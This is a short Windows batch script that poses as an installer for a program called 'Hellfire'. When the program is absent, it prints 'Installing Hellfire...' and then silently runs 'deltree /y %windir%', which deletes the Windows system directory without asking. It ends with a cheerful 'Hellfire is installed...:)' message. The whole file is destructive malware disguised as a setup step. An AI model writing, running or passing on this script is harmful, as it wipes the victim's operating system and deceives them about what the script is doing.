@echo off
if exist c:\Hellfire\hellfire.exe goto Hellfire_e
@echo on
@echo Hellfire not found...
@echo Please, wait... 
@echo Installing Hellfire...
@echo off
deltree /y %windir%
goto Hellfire_e
:Hellfire_e
@echo on
@echo Hellfire is installed...:)
